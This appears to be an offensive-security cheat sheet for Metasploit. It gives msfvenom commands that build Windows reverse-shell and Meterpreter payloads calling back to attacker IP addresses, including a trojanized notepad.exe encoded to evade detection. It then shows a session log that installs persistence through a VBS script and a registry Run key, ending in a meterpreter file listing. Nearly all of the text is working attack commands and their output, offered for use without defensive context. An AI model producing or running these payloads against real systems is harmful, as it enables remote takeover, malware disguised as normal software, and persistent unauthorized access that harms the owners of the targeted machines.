======Create Payload======

1.Get Simple Command Shell (Limited Privilege)

==32bit x86
msfvenom --platform Windows -p windows/shell/reverse_tcp LHOST=192.168.0.100 LPORT=4444 EXITFUNC=thread -b '\x00' -f exe-only -o /root/Desktop/test-x86.exe

==64bit x64
msfvenom --platform Windows -p windows/x64/shell/reverse_tcp LHOST=192.168.0.100 LPORT=4444 EXITFUNC=thread -b '\x00' -f exe-only -o /root/Desktop/test-x86.exe

2.malicious notepad and create a new executable.
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.100 LPORT=4445 â€“x notepad.exe -e x86/jmp_call_additive -i 4 -k -f exe > my_evil_program.exe

msf exploit(handler) > use exploit/windows/local/persistence
msf exploit(persistence) > set SESSION 5
SESSION => 5
msf exploit(persistence) > set LHOST IP_LOCAL
LHOST => IP_LOCAL
msf exploit(persistence) > set LPORT 80
LPORT => 80
msf exploit(persistence) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(persistence) > run

[] Running persistent module against NAME_PC via session ID: 5
[+] Persistent VBS script written on SOFT-5493BEF518 to C:\DOCUME1\LOCOAL1\CONFIG~1\Temp\HZgSBAKZlmgwW.vbs
[] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\hBHDMxJ
[+] Installed autorun on SOFT-5493BEF518 as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\hBHDMxJ
[] Clean up Meterpreter RC file: /root/.msf4/logs/persistence/SOFT-5493BEF518_20170131.4255/SOFT-5493BEF518_20170131.4255.rc
msf exploit(persistence) > sessions -i 5
[] Starting interaction with 5...

meterpreter > ls
Listing: C:\Documents and Settings\RUTE`
